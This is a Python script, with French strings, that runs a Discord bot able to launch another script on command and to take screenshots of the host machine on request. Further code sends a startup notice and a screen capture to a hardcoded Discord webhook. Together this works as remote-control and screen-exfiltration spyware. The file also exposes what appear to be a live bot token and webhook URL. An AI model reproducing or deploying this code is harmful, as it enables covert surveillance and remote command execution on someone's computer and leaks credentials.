import requests
from PIL import ImageGrab
import os
from datetime import datetime
import time 
import discord
from discord import app_commands
import subprocess

TOKEN = "MTM5OTUyOTIyMzMxMTU4OTQ1Nw.GdKiWc.e9uqcumFDxHYIFd8jgElF9qTmz4v6O5R_oaZ_I"

intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

@client.event
async def on_message(message):
    if message.content == "!lance":
        subprocess.Popen(["python", "lance.py"])
        await message.channel.send("Script lancé !")

@tree.command(name="scree", description="Prend une capture d'écran et l'envoie ici")
async def scree(interaction: discord.Interaction):
    screenshot_path = "screenshot.png"
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        await interaction.response.send_message("Voici la capture d'écran :", file=discord.File(screenshot_path))
    except Exception as e:
        await interaction.response.send_message(f"Erreur lors de la capture d'écran : {e}")
    finally:
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)

@client.event
async def on_ready():
    await tree.sync()
    print(f"Connecté en tant que {client.user}")

client.run(TOKEN)

WEBHOOK_URL = "https://discord.com/api/webhooks/1375188922644304054/YT7__8T369CKtxPDUjf4SRXrtOHNqOT8cby4SlDbBWtxkqtYhLJSMCkZKvN07iQ3XDrN"


now = datetime.now()
heure_str = now.strftime("%Y-%m-%d %H:%M:%S")
message = {
    "username": "Ton PC",
    "content": f"🖥️ Ton PC vient de démarrer à {heure_str} !"
}




try:
    response = requests.post(WEBHOOK_URL, json=message)
    if response.status_code == 204:
        print("Message envoyé avec succès.")
    else:
        print(f"Erreur lors de l'envoi du message : {response.status_code}, {response.text}")
except Exception as e:
    print(f"Exception lors de l'envoi du message : {e}")


screenshot_path = "screenshot.png"
try:
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    print("Capture d'écran prise avec succès.")
except Exception as e:
    print(f"Erreur lors de la capture d'écran : {e}")
    exit(1)

 

try:
    with open(screenshot_path, "rb") as f:
        files = {"file": ("screenshot.png", f, "image/png")}
        data = {"content": "-"}
        response = requests.post(WEBHOOK_URL, data=data, files=files)

    if response.status_code == 204:
        print("Capture d'écran envoyée avec succès.")
    else:
        print(f"Erreur lors de l'envoi de la capture d'écran : {response.status_code}, {response.text}")
except Exception as e:
    print(f"Exception lors de l'envoi de la capture d'écran : {e}")
finally:
    if os.path.exists(screenshot_path):
        os.remove(screenshot_path)
